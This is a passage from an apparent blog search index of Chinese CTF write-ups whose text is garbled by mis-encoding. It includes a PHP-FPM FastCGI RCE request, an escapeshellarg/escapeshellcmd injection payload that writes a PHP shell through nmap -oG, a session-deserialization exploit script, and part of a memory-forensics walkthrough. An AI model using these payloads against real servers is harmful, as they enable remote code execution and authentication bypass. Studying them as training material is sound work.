&#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;, &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content), &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;, &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27; &#125; response = client.request(params, content) print(force_text(response)) æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªè¿›è¡ŒRCEã€‚é—®é¢˜æ˜¯æˆ‘ä»¬éœ€è¦çŸ¥é“ä¸€ä¸ªç›®æ ‡æœåŠ¡å™¨ä¸ŠPHPæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚åœ¨æ‰«80ç«¯å£çš„æ—¶å€™æˆ‘ä»¬å‘ç°ä»–æœ‰ä¸€ä¸ªredirect.phpã€‚å¤§èƒ†çŒœæµ‹ä¸€ä¸‹Web1å’ŒWeb2çš„è·¯å¾„æ˜¯ä¸€æ ·çš„ï¼Œéƒ½åœ¨/wwwä¸‹ï¼Œè¯•ä¸€ä¸‹ã€‚ çœ‹åˆ°Flagäº†ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰æƒé™æ‹¿åˆ°ã€‚æ€ä¹ˆåŠï¼Ÿæˆ‘ä»¬ä¼¼ä¹è¿˜æœ‰ä¸€ä¸ª873 Rsyncæ²¡æœ‰åˆ©ç”¨ã€‚å‚è€ƒè¿™ä¸ªã€‚çœ‹ä¸€ä¸‹rsyncçš„é…ç½®ã€‚Ubuntué»˜è®¤å°†rsyncçš„é…ç½®ä¿å­˜åœ¨/etc/rsyncd.confä¸­ã€‚srcèŠ‚ä¸­å°†è·¯å¾„è®¾ç½®åœ¨æ ¹ä¸‹ï¼Œæ»¡è¶³æ¡ä»¶ã€‚æˆ‘ä»¬ç”¨rsyncæ‹–ä¸‹æ¥flagã€‚ ç„¶åcat /tmp/7h1s_i5_f14gå°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚ flag{f85231ab-fe4c-46b7-801c-a9eb844b43e2}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Shell","slug":"Shell","permalink":"http://tiaonmmn.github.io/tags/Shell/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"http://tiaonmmn.github.io/tags/PHP-FPM/"},{"name":"RSync","slug":"RSync","permalink":"http://tiaonmmn.github.io/tags/RSync/"}]},{"title":"BUUOJåˆ·é¢˜-Web-Online-Tool","slug":"BUUOJåˆ·é¢˜-Web-Online-Tool","date":"2019-09-08T10:27:18.000Z","updated":"2019-12-10T12:15:12.601Z","comments":true,"path":"2019/09/08/BUUOJåˆ·é¢˜-Web-Online-Tool/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/08/BUUOJ%E5%88%B7%E9%A2%98-Web-Online-Tool/","excerpt":"BUUCTF 2018çš„Online Toolã€‚ç»™äº†æºç ï¼š","text":"BUUCTF 2018çš„Online Toolã€‚ç»™äº†æºç ï¼š 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET[&#x27;host&#x27;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &#x27;you are in sandbox &#x27;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125; çœ‹åˆ°systemå°±æƒ³åˆ°å‘½ä»¤æ³¨å…¥äº†ï¼Œä¸‹é¢ä»”ç»†çœ‹ä¸€ä¸‹ä¼ å…¥çš„å‚æ•°ã€‚$hostç»GETä¼ å…¥ï¼Œç„¶åè¿‡escapeshellargå’Œescapeshellcmdå¤„ç†ï¼Œæœ€åä¼ å…¥nmapã€‚escapeshellargå’Œescapeshellcmdç”¨æ¥è½¬ä¹‰å‘½ä»¤è¡Œå’Œå‚æ•°ã€‚ä»–ä»¬ä¿©å•ç‹¬ä½¿ç”¨æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å¦‚æœåŒæ—¶ä½¿ç”¨å°±äº§ç”Ÿé—®é¢˜äº†ã€‚å°±æœ¬é¢˜è€Œè¨€ï¼Œç®€å•æ¥è¯´æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®ï¼ˆä»¥' &lt;?php phpinfo();?&gt; -oG test/mmm.txtä¸ºä¾‹ï¼‰ä¼šå˜æˆè¿™æ ·ï¼š å…ˆè¿›è¡Œescapeshellargç¼–ç ï¼Œä¼šå°†'è½¬ä¹‰ï¼Œå˜æˆï¼š''\\'' &lt;?php phpinfo();?&gt; -oG test/mmm.txt'ã€‚æˆ‘ä»¬è¾“å…¥çš„å•å¼•å·ä½¿ç”¨\\è½¬ä¹‰ï¼Œæ­¤æ—¶å•å¼•å·è¢«å½“æˆæ™®é€šå­—ç¬¦å¤„ç†ï¼Œéœ€è¦è¢«''åŒ…è£¹ï¼Œè€Œè¿”å›ç»“æœçš„ç¬¬ä¸€ä¸ªä¸æœ€åä¸€ä¸ªå•å¼•å·å­—ç¬¦æ˜¯escapeshellargæ·»åŠ çš„ã€‚ è¿›è¡Œescapeshellcmdç¼–ç ï¼Œè¿”å›''\\\\'' \\&lt;\\?php phpinfo\\(\\)\\;\\?\\&gt; -oG test/mmm.txt\\'ã€‚escapeshellcmdä¼šåœ¨*&#;`|\\*?~^()[]{}$\\*, *\\x0A* å’Œ *\\xFF*å­—ç¬¦å‰åŠ ä¸€ä¸ª\\ï¼Œå› æ­¤ç¬¬ä¸€éƒ¨ä¸­æ’å…¥çš„\\è‡ªèº«è¢«è½¬ä¹‰ï¼ŒåŸæœ¬è¢«è½¬ç§»çš„å•å¼•å·å¼€å§‹æœ‰æ„ä¹‰ï¼Œè€Œ''\\\\''è¿™ç»„å•å¼•å·å·²ç»é…å¯¹ï¼Œç¬¬ä¸€æ­¥escapeshellargé€ æˆçš„é™åˆ¶å·²ç»è§£é™¤ã€‚åä¹°ä½ çš„å†…å®¹æˆ‘ä»¬å®Œå…¨å¯æ§ã€‚è€Œæœ€åçš„å•å¼•å·åˆ™ä¼šå› ä¸ºå•å¼•å·ä¸é…å¯¹è¢«è½¬ä¹‰ï¼Œå¯¹æˆ‘ä»¬çš„å‘½ä»¤ä¸é€ æˆä»»ä½•å½±å“ã€‚ é‚£ä¹ˆæˆ‘ä»¬å°±é€ƒé€¸å‡ºæ¥äº†ã€‚ä½†æ˜¯ç°åœ¨çš„é—®é¢˜æ˜¯æˆ‘ä»¬æ²¡æ³•æ‰“æ–­åŸæœ¬çš„nmapå‘½ä»¤è¡Œï¼Œå¸¸è§çš„|ï¼Œ;éƒ½ä¼šè¢«escapeshellcmdè½¬ä¹‰æ‰ã€‚é‚£æˆ‘ä»¬åªèƒ½æƒ³åŠæ³•é€šè¿‡nmapå‘½ä»¤å‚æ•°è¿›è¡Œäº›äº‹æƒ…äº†ã€‚ nmapçš„è¾“å‡ºé€‰é¡¹ä¸­æœ‰ä¸€ä¸ªå¾ˆæœ‰æ„æ€ï¼š-oGï¼Œè¿™ä¸ªæ ¼å¼ä¼šå°†nmapçš„è¾“å‡ºå®Œæ•´è¾“å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œä¸è½¬ä¹‰ã€‚å¦‚æœä½¿ç”¨é»˜è®¤çš„-oNï¼Œä¼šè½¬ä¹‰ã€‚é‚£ä¹ˆ å¥½äº†ï¼Œæˆ‘ä»¬çš„Payloadå¾ˆæ˜ç¡®äº†ï¼Œå†™ä¸€ä¸ªShellåˆ°æ–‡ä»¶ä¸­ã€‚' &lt;?php phpinfo();?&gt; -oG test.php'ã€‚ç„¶åè®¿é—®ç›¸å…³ç›®å½•çš„test.phpå°±ä¼šå¾—åˆ°phpinfoä¿¡æ¯äº†ã€‚ç„¶åå†™ä¸ªshellï¼Œæˆ–è€…è¯»æ–‡ä»¶ä»€ä¹ˆçš„éšä½ äº†ã€‚ flag{1c23e720-d581-403a-8fc1-70a0f633c485}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"escapeshellarg","slug":"escapeshellarg","permalink":"http://tiaonmmn.github.io/tags/escapeshellarg/"},{"name":"escapeshellcmd","slug":"escapeshellcmd","permalink":"http://tiaonmmn.github.io/tags/escapeshellcmd/"},{"name":"å‘½ä»¤æ³¨å…¥","slug":"å‘½ä»¤æ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"}]},{"title":"BUUOJåˆ·é¢˜-Web-Easy Notes","slug":"BUUOJåˆ·é¢˜-Web-Easy-Notes","date":"2019-09-07T03:29:20.000Z","updated":"2020-03-02T11:40:50.846Z","comments":true,"path":"2019/09/07/BUUOJåˆ·é¢˜-Web-Easy-Notes/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/07/BUUOJ%E5%88%B7%E9%A2%98-Web-Easy-Notes/","excerpt":"HarekazeCTF 2019çš„Easy Notesã€‚","text":"HarekazeCTF 2019çš„Easy Notesã€‚ å…ˆæŠŠæºç è„±ä¸‹æ¥ã€‚index.phpæ²¡æœ‰LFIã€‚pages/flag.phpè¦æ±‚is_admin()æˆåŠŸåæ˜¾ç¤ºflagã€‚is_admin()åœ¨lib.phpä¸­ï¼š 123456function is_admin() &#123; if (!isset($_SESSION[&#x27;admin&#x27;])) &#123; return false; &#125; return $_SESSION[&#x27;admin&#x27;] === true;&#125; è¦æ±‚SESSIONéªŒè¯ï¼Œé‚£æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹SESSIONå¤„ç†çš„ç›¸å…³ä»£ç ã€‚init.phpä¸­å‡ºç°session_save_pathä¸º\"/var/www/tmp/\"ã€‚ç„¶åå…¨éƒ¨ä»£ç å†æ²¡æœ‰æè¿‡$_SESSION['admin']äº†ï¼ŒåŒæ—¶ä¹Ÿæ²¡æœ‰æ•°æ®åº“çš„å‚ä¸ã€‚é‚£å°±è¦è€ƒè™‘ä¸€ä¸‹Sessionååºåˆ—åŒ–çš„é—®é¢˜äº†ã€‚ æ¥ç€çœ‹ä»£ç ï¼Œåœ¨ç”¨æˆ·ç™»å½•ä»¥åå¯ä»¥æ·»åŠ Notesï¼Œä»¥åŠExportã€‚æ·»åŠ Notesï¼Œä¼šæŠŠç›¸å…³æ•°æ®å†™åˆ°Sessioné‡Œã€‚Exportçš„æ—¶å€™å¯ä»¥é€‰æ‹©Taræˆ–è€…Zipï¼Œå¦‚æœæŒ‡å®šä¸ºTarä¼šä½¿ç”¨Pharè¿›è¡Œå‹ç¼©ï¼Œå¦åˆ™å°±ä¼šä½¿ç”¨Zipã€‚æ³¨æ„typeæ˜¯å¯ä»¥é€šè¿‡GETä¼ é€’çš„ï¼Œé‚£ä¹ˆå¦‚æœtypeè®¾ä¸º.ï¼Œå°±ä¼šè¿åŒå‰é¢çš„.ä¸€èµ·è¢«åˆ é™¤ã€‚é‚£ä¹ˆæ–‡ä»¶å°±å˜æˆäº†sess_-(éšæœºæ•°å­—)ï¼Œä¿å­˜åœ¨/var/www/tmpä¸‹ã€‚ PHPä½¿ç”¨æ–‡ä»¶å­˜å‚¨Sessionä¿¡æ¯ï¼Œå¹¶ä¸”ã€‚å› æ­¤å¦‚æœæˆ‘ä»¬æŠŠSessionæ–‡ä»¶æ›¿æ¢äº†ï¼Œå†™å…¥adminä¿¡æ¯ï¼Œé‚£ä¹ˆFlagå°±ä¼šå‡ºæ¥äº†ã€‚PHPçš„Sessionæ–‡ä»¶ä»¥\"sess_\"å¼€å¤´ï¼Œåæ¥Session IDï¼ŒSession IDä»…æœ‰[A-Za-z0-9-0]æ„æˆã€‚Ubuntué»˜è®¤å®‰è£…çš„PHPä¸­session.serialize_handleré»˜è®¤è®¾ç½®ä¸ºphpã€‚è¿™ç§æƒ…å†µä¸‹ï¼ŒSessionæ–‡ä»¶çš„å†…å®¹ä¸º(å±æ€§å)|(åºåˆ—åŒ–æ•°æ®)ã€‚åœ¨è®¿é—®Sessionæ•°æ®çš„æ—¶å€™ï¼ŒPHPä¼šè‡ªåŠ¨ååºåˆ—åŒ–ç›¸åº”æ•°æ®ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬æ„é€ Noteçš„æ ‡é¢˜åä¸º\"|N;admin|b:1;\"ã€‚è¿™æ ·ååºåˆ—åŒ–çš„ç»“æœå°±æ˜¯admin==bool(true)ã€‚æˆ‘ä»¬å°±ä¼ªé€ äº†adminèº«ä»½ã€‚è€Œæˆ‘ä»¬è®¿é—®çš„æ—¶å€™ï¼Œé€šè¿‡ä¼ é€’Cookieçš„å€¼PHPSESSIDä¸ºæˆ‘ä»¬æƒ³è¦çš„Session IDï¼ŒPHPå°±ä¼šå»ååºåˆ—åŒ–ç›¸åº”çš„Sessionæ–‡ä»¶ã€‚ é‚£ä¹ˆï¼Œæ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š 1. æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œåä¸º&quot;sess\\_&quot; 2. æ·»åŠ ä¸€ä¸ªNoteï¼Œæ ‡é¢˜ä¸º&quot;|N;admin|b:1;&quot;ï¼Œå†…å®¹ä»»æ„ 3. è®¿é—®&quot;export.php?type=.&quot;ï¼Œå°†æˆ‘ä»¬æƒ³è¦çš„ååºåˆ—åŒ–æ•°æ®å†™å…¥Sessionæ–‡ä»¶ï¼Œè¿”å›çš„é¡µé¢ä¸­ä¼šå‡ºç°æ–‡ä»¶å 4. å¸¦ä¸Šåˆšæ‰çš„PHPSESSID Cookieè®¿é—®/?page=flagè·å–flagã€‚ è„šæœ¬å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930 import re import requests URL = &#x27;http://(target)/&#x27;while True: # login as sess_ sess = requests.Session() sess.post(URL + &#x27;login.php&#x27;, data=&#123; &#x27;user&#x27;: &#x27;sess_&#x27; &#125;) # make a crafted note sess.post(URL + &#x27;add.php&#x27;, data=&#123; &#x27;title&#x27;: &#x27;|N;admin|b:1;&#x27;, &#x27;body&#x27;: &#x27;hello&#x27; &#125;) # make a fake session r = sess.get(URL + &#x27;export.php?type=.&#x27;).headers[&#x27;Content-Disposition&#x27;] sessid = re.findall(r&#x27;sess_([0-9a-z-]+)&#x27;, r)[0] # get the flag r = requests.get(URL + &#x27;?page=flag&#x27;, cookies=&#123; &#x27;PHPSESSID&#x27;: sessid &#125;).content.decode(&#x27;utf-8&#x27;) flag = re.findall(r&#x27;flag\\&#123;.+\\&#125;&#x27;, r) if len(flag) &gt; 0: print(flag[0]) break flag{d1bdac0f-d30d-4998-a79d-f9b7d4bac14f}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Session","slug":"Session","permalink":"http://tiaonmmn.github.io/tags/Session/"}]},{"title":"Chaos-Communication-Camp-2019-FlagConverter","slug":"Chaos-Communication-Camp-2019-FlagConverter","date":"2019-09-05T13:09:52.000Z","updated":"2019-12-10T12:15:12.606Z","comments":true,"path":"2019/09/05/Chaos-Communication-Camp-2019-FlagConverter/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/05/Chaos-Communication-Camp-2019-FlagConverter/","excerpt":"Chaos Communication Camp 2019çš„FlagConverterï¼Œè¿™é¢˜ä¸€å…±ä¸‰ä¸ªflagã€‚é¢˜ç›®æè¿°ï¼š On the campground of the CCCamp, someone is trying to troll us by encrypting our flags. Sadly, we only got the memory dump of the PC which encrypted our flags.","text":"Chaos Communication Camp 2019çš„FlagConverterï¼Œè¿™é¢˜ä¸€å…±ä¸‰ä¸ªflagã€‚é¢˜ç›®æè¿°ï¼š On the campground of the CCCamp, someone is trying to troll us by encrypting our flags. Sadly, we only got the memory dump of the PC which encrypted our flags. é™„ä»¶åœ¨è¿™é‡Œã€‚ ç»™äº†ä¸ªdmpæ–‡ä»¶ï¼Œåº”è¯¥æ˜¯Windowsçš„å†…å­˜Dumpã€‚å…ˆè¯´ä¸€ä¸‹ï¼Œè¿™é¢˜çš„flagå¼€å¤´ä¸ºALLESã€‚é‚£æˆ‘ä»¬å…ˆæœä¸€ä¸‹å­—ç¬¦ä¸²å¥½äº†ã€‚strings dmp.dmp|grep -i \"ALLES{\"ä¼šæ‰¾åˆ°ä¸€ä¸ªflagï¼šALLES{f0r3n51k_15_50m3t1m35_t00_345y}ã€‚ ä¸‹ä¸€æ­¥æ˜¯åˆ†æå†…å­˜äº†ã€‚å†…å­˜Dumpå¿…ç”¨Volatilityã€‚å…ˆåˆ†æä¸€ä¸‹dmpæ˜¯é‚£ç§æ“ä½œç³»ç»Ÿçš„ã€‚ 1234567891011121314151617volatility imageinfo -f flagconverter.dmp Volatility Foundation Volatility Framework 2.6INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS) AS Layer3 : FileAddressSpace (&#x2F;root&#x2F;flagconverter.dmp) PAE type : No PAE DTB : 0x187000L KDBG : 0xf800027ff120L Number of Processors : 2 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff80002801000L KPCR for CPU 1 : 0xfffff880009eb000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2019-08-21 05:55:09 UTC+0000 Image local date and time : 2019-08-21 07:55:09 +0200 Windows 7 SP1 x64çš„ç³»ç»Ÿã€‚é‚£æˆ‘ä»¬æ¥åˆ—ä¸€ä¸‹è¿›ç¨‹ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839volatility pslist -f flagconverter.dmp --profile&#x3D;Win7SP1x64Volatility Foundation Volatility Framework 2.6Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------0xfffffa8000ca0040 System 4 0 86 377 ------ 0 2019-08-21 05:52:02 UTC+0000 0xfffffa8002861330 smss.exe 280 4 2 30 ------ 0 2019-08-21 05:52:02 UTC+0000 0xfffffa80027dd700 csrss.exe 364 340 9 355 0 0 2019-08-21 05:52:05 UTC+0000 0xfffffa8007e4f8e0 wininit.exe 404 340 3 76 0 0 2019-08-21 05:52:05 UTC+0000 0xfffffa8007eaeb00 csrss.exe 424 412 8 188 1 0 2019-08-21 05:52:05 UTC+0000 0xfffffa8001d1e060 winlogon.exe 468 412 4 115 1 0 2019-08-21 05:52:05 UTC+0000 0xfffffa8001d6f820 services.exe 504 404 10 188 0 0 2019-08-21 05:52:05 UTC+0000 0xfffffa8001d75b00 lsass.exe 520 404 7 484 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001d74710 lsm.exe 528 404 10 147 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001dbeb00 svchost.exe 640 504 11 354 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001c73060 VBoxService.ex 704 504 14 125 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001f2fb00 svchost.exe 764 504 7 240 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001f71b00 svchost.exe 852 504 21 425 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001f77b00 svchost.exe 908 504 21 435 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001fa2060 svchost.exe 936 504 13 248 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001fc2060 svchost.exe 988 504 34 888 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001ff9b00 audiodg.exe 304 852 4 114 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8002094200 svchost.exe 1068 504 15 350 0 0 2019-08-21 05:52:07 UTC+0000 0xfffffa80020ddb00 spoolsv.exe 1208 504 14 292 0 0 2019-08-21 05:52:07 UTC+0000 0xfffffa80020fd7d0 svchost.exe 1252 504 19 300 0 0 2019-08-21 05:52:07 UTC+0000 0xfffffa80021a0240 svchost.exe 1352 504 12 150 0 0 2019-08-21 05:52:07 UTC+0000 0xfffffa8000d48610 taskhost.exe 1828 504 9 172 1 0 2019-08-21 05:52:10 UTC+0000 0xfffffa80022dfb00 dwm.exe 1900 908 4 76 1 0 2019-08-21 05:52:10 UTC+0000 0xfffffa800230d910 explorer.exe 1924 1884 24 788 1 0 2019-08-21 05:52:10 UTC+0000 0xfffffa80023a7640 VBoxTray.exe 960 1924 13 141 1 0 2019-08-21 05:52:11 UTC+0000 0xfffffa80020c1060 SearchIndexer. 1816 504 13 647 0 0 2019-08-21 05:52:18 UTC+0000 0xfffffa80024133a0 SearchProtocol 1164 1816 6 272 0 0 2019-08-21 05:52:18 UTC+0000 0xfffffa8002428710 SearchFilterHo 844 1816 4 95 0 0 2019-08-21 05:52:18 UTC+0000 0xfffffa800246e530 converter.exe 2308 2280 11 183 1 0 2019-08-21 05:52:25 UTC+0000 0xfffffa800246fb00 converter.exe 2316 2280 10 152 1 0 2019-08-21 05:52:25 UTC+0000 0xfffffa8000e06b00 sppsvc.exe 2732 504 6 152 0 0 2019-08-21 05:54:09 UTC+0000 0xfffffa8000e0b060 svchost.exe 2760 504 12 376 0 0 2019-08-21 05:54:09 UTC+0000 0xfffffa8002443390 WmiPrvSE.exe 2976 640 8 142 0 0 2019-08-21 05:54:56 UTC+0000 converter.exeä¼¼ä¹å¾ˆæ‰çœ¼ã€‚æˆ‘ä»¬ç”¨procdumpæå‡ºæ¥ã€‚2308æå‡ºæ¥å¤§æ¦‚8MBï¼Œè€Œ2316åªæœ‰8KBã€‚ä»–ä¿©ä¼¼ä¹éƒ½æ˜¯.Netçš„ç¨‹åºã€‚è€Œ2308æ˜¯å¯ä»¥ç›´æ¥è¿è¡Œçš„ã€‚æˆ‘ä»¬ç”¨dotPeekåç¼–è¯‘ä¸€ä¸‹ã€‚2308çš„ä»£ç å¤ªå¤§äº†ï¼Œæˆ‘ä»¬æš‚æ—¶ä¸è€ƒè™‘ã€‚è€Œ2316.exeä¸­æœ‰ä¸€æ®µä»£ç æˆ‘ä»¬å¾ˆæ„Ÿå…´è¶£ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738using someCrypto;using System;using System.ComponentModel;using System.Drawing;using System.IO;using System.Text;using System.Windows.Forms;namespace converter&#123; public class Form1 : Form &#123; public string string_0 = &quot;&quot;; public MemoryStream ms = new MemoryStream(800); private IContainer components; private Button button; private RichTextBox text; public Form1() &#123; this.InitializeComponent(); &#125; private void Click_Button(object sender, EventArgs e) &#123; Crypto crypto = new Crypto(); crypto.function03(); this.string_0 = Convert.ToBase64String(crypto.function02(this.text.Text)); crypto.Dispose(); GC.Collect(); GC.WaitForPendingFinalizers(); this.ms.Read(Encoding.ASCII.GetBytes(this.string_0), 0, Encoding.ASCII.GetBytes(this.string_0).Length); this.text.Text = this.string_0; &#125; &#125;&#125; å…¶ä¸­ç”¨åˆ°äº†someCryptoï¼Ÿé‚£æˆ‘ä»¬ç”¨dlllistæŸ¥ä¸€ä¸‹2316ç”¨åˆ°çš„DLLã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950volatility dlllist -f flagconverter.dmp --profile&#x3D;Win7SP1x64 -p 2316Volatility Foundation Volatility Framework 2.6************************************************************************converter.exe pid: 2316Command line : C:\\Users\\ALLES\\Desktop\\3\\converter.exe Service Pack 1Base Size LoadCount LoadTime Path------------------ ------------------ ------------------ ------------------------------ ----0x0000000001090000 0x8000 0xffff 1970-01-01 00:00:00 UTC+0000 C:\\Users\\ALLES\\Desktop\\3\\converter.exe0x0000000077aa0000 0x19f000 0xffff 1970-01-01 00:00:00 UTC+0000 C:\\Windows\\SYSTEM32\\ntdll.dll0x000007fef5020000 0x6f000 0xffff 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\SYSTEM32\\MSCOREE.DLL0x0000000077980000 0x11f000 0xffff 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\KERNEL32.dll0x000007fefd770000 0x6a000 0xffff 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\KERNELBASE.dll0x000007feff5a0000 0xdb000 0xe 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\ADVAPI32.dll0x000007feff680000 0x9f000 0x68 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\msvcrt.dll0x000007feff4e0000 0x1f000 0x3b 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\SYSTEM32\\sechost.dll0x000007feffb90000 0x12d000 0x2b 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\RPCRT4.dll0x000007fef4f80000 0x9c000 0x1 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscoreei.dll0x000007fefd9b0000 0x71000 0x9 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\SHLWAPI.dll0x000007feff720000 0x67000 0x83 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\GDI32.dll0x0000000077880000 0xfa000 0x87 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\USER32.dll0x000007feff170000 0xe000 0x1f 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\LPK.dll0x000007feffcc0000 0xcb000 0x1f 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\USP10.dll0x000007feff140000 0x2e000 0x3 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\IMM32.DLL0x000007feff030000 0x109000 0x3 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\MSCTF.dll0x000007fefc830000 0xc000 0x2 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\VERSION.dll0x000007fef33f0000 0x9a0000 0x3 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\mscorwks.dll0x0000000074f00000 0xc9000 0x4 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\WinSxS\\amd64_microsoft.vc80.crt_1fc8b3b9a1e18e3b_8.0.50727.4940_none_88df89932faf0bf6\\MSVCR80.dll0x000007fefdbb0000 0xd8a000 0x2 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\shell32.dll0x000007feff790000 0x1ff000 0x9 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\ole32.dll0x000007fefd5f0000 0xf000 0x1 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\profapi.dll0x000007fef2440000 0xee3000 0x1 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\assembly\\NativeImages_v2.0.50727_64\\mscorlib\\a83e2c5a3237fc549e8ccb54585ff2c1\\mscorlib.ni.dll0x000007fefd3f0000 0xf000 0x2 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\system32\\CRYPTBASE.dll0x000007fefbdb0000 0x56000 0x4 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\system32\\uxtheme.dll0x000007fef17c0000 0x183000 0x1 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\mscorjit.dll0x000007fef0d80000 0xa33000 0x1 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\assembly\\NativeImages_v2.0.50727_64\\System\\9bb115aedc44c70bb3f6cf4ac4f3f9cb\\System.ni.dll0x000007fef0b40000 0x239000 0x1 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\assembly\\NativeImages_v2.0.50727_64\\System.Drawing\\24637f09c78822f6e1b3b531489f223f\\System.Drawing.ni.dll0x000007feefaa0000 0x1098000 0x1 2019-08-21 05:52:26 UTC+0000 